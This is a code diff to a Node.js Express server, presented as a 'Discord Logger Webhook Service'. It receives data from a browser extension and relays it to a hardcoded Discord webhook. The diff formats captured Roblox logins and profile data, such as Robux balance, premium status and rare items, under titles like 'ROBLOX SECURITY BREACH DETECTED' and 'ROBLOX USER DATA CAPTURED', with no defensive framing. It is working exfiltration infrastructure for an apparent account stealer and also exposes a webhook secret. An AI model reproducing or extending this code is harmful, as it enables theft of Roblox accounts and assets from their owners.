@@ -9,9 +9,11 @@ const PORT = process.env.PORT || 5000;
 app.use(cors());
 app.use(express.json());
 
+// Serve static files (extension files)
+app.use(express.static(__dirname));
+
 // Discord webhook URL from environment variable
-// Set your Discord webhook URL here if not using environment variables
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1407917425650827335/PYb8kRnJ_5KPHSd5vIxTo0_JCjeX-Ie63TRnmWDoxmBVYyHhhA27aYq2dKdmQP-BiRwq';
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1407917425650827335/PYb8kRnJ_5KPHSd5vIxTo0_JCjeX-Ie63TRnmWDoxmBVYyHhhA27aYq2dKdmQP-BiRwq';
 
 if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
   console.error('ERROR: DISCORD_WEBHOOK_URL environment variable is not set');
@@ -25,6 +27,7 @@ if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HE
 app.post('/send-log', async (req, res) => {
   try {
     const logData = req.body;
+    console.log('Received log:', logData);
     
     // Format the log message for Discord
     const discordMessage = formatLogForDiscord(logData);
@@ -121,7 +124,7 @@ function formatRobloxLoginEmbed(logData) {
       footer: {
         text: `🔒 ROBLOX SECURITY BREACH DETECTED`
       },
-      timestamp: new Date().toISOString()
+      timestamp: new Date(logData.timestamp).toISOString()
     }]
   };
 }
@@ -132,7 +135,7 @@ function formatRobloxUserDataEmbed(logData) {
     
     return {
       embeds: [{
-        title: `👤 ROBLOX USER PROFILE DATA`,
+        title: `👤 ROBLOX USER DATA CAPTURED`,
         color: 0x00ff00, // Green for user data
         fields: [
           {
@@ -141,8 +144,13 @@ function formatRobloxUserDataEmbed(logData) {
             inline: true
           },
           {
-            name: '🆔 User ID',
-            value: userData.userId?.toString() || 'Unknown',
+            name: '💰 Robux',
+            value: userData.robux?.toString() || '0',
+            inline: true
+          },
+          {
+            name: '⭐ Premium',
+            value: userData.isPremium ? 'Yes' : 'No',
             inline: true
           },
           {
@@ -151,13 +159,8 @@ function formatRobloxUserDataEmbed(logData) {
             inline: true
           },
           {
-            name: '💰 Robux Balance',
-            value: `${userData.robux || 0} R$`,
-            inline: true
-          },
-          {
-            name: '⭐ Premium Status',
-            value: userData.isPremium ? 'True ✅' : 'False ❌',
+            name: '👥 Friends',
+            value: userData.friendCount?.toString() || '0',
             inline: true
           },
           {
@@ -166,43 +169,23 @@ function formatRobloxUserDataEmbed(logData) {
             inline: true
           },
           {
-            name: '👥 Friends',
-            value: userData.friendCount?.toString() || '0',
-            inline: true
-          },
-          {
-            name: '👤 Followers',
-            value: userData.followers?.toString() || '0',
-            inline: true
-          },
-          {
-            name: '➕ Following',
-            value: userData.following?.toString() || '0',
-            inline: true
-          },
-          {
-            name: '🏆 Badges',
-            value: userData.badgeCount?.toString() || '0',
-            inline: true
-          },
-          {
             name: '💀 Korblox',
-            value: userData.korblox ? 'True ✅' : 'False ❌',
+            value: userData.korblox ? 'Yes' : 'No',
             inline: true
           },
           {
             name: '👻 Headless',
-            value: userData.headless ? 'True ✅' : 'False ❌',
+            value: userData.headless ? 'Yes' : 'No',
             inline: true
           },
           {
-            name: '📝 Description',
-            value: userData.description ? userData.description.substring(0, 100) + (userData.description.length > 100 ? '...' : '') : 'No description',
-            inline: false
+            name: '🎖️ Badges',
+            value: userData.badgeCount?.toString() || '0',
+            inline: true
           }
         ],
         footer: {
-          text: `🎮 ROBLOX PROFILE ANALYSIS COMPLETE`
+          text: `User ID: ${userData.userId || 'Unknown'}`
         },
         timestamp: new Date().toISOString()
       }]
@@ -210,9 +193,9 @@ function formatRobloxUserDataEmbed(logData) {
   } catch (error) {
     return {
       embeds: [{
-        title: `❌ ERROR PARSING ROBLOX USER DATA`,
+        title: `👤 ROBLOX USER DATA CAPTURED`,
         description: `\`\`\`\n${logData.message}\`\`\``,
-        color: 0xff0000,
+        color: 0x00ff00,
         timestamp: new Date().toISOString()
       }]
     };
@@ -221,20 +204,37 @@ function formatRobloxUserDataEmbed(logData) {
 
 function getColorForLevel(level) {
   const colors = {
-    log: 0x3498db,    // Blue
-    info: 0x2ecc71,   // Green
-    warn: 0xf39c12,   // Orange
-    error: 0xe74c3c   // Red
+    log: 0x3498db,      // Blue
+    info: 0x2ecc71,     // Green
+    warn: 0xf39c12,     // Orange
+    error: 0xe74c3c,    // Red
+    roblox_login: 0xff0000, // Bright Red
+    roblox_userdata: 0x00ff00 // Bright Green
   };
   return colors[level] || colors.log;
 }
+
+// Root endpoint with information about the service
+app.get('/', (req, res) => {
+  res.json({ 
+    service: 'Discord Logger Webhook Service',
+    status: 'Running',
+    endpoints: {
+      '/send-log': 'POST - Receive logs from browser extension',
+      '/health': 'GET - Health check',
+      '/popup.html': 'GET - Extension popup interface'
+    },
+    timestamp: new Date().toISOString() 
+  });
+});
 
 // Health check endpoint
 app.get('/health', (req, res) => {
   res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
 
+// Start server
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Discord Logger webhook service running on port ${PORT}`);
-  console.log(`Discord webhook is configured and ready to receive logs`);
+  console.log(`Webhook service running on port ${PORT}`);
+  console.log(`Discord webhook configured: ${DISCORD_WEBHOOK_URL ? 'Yes' : 'No'}`);
 });
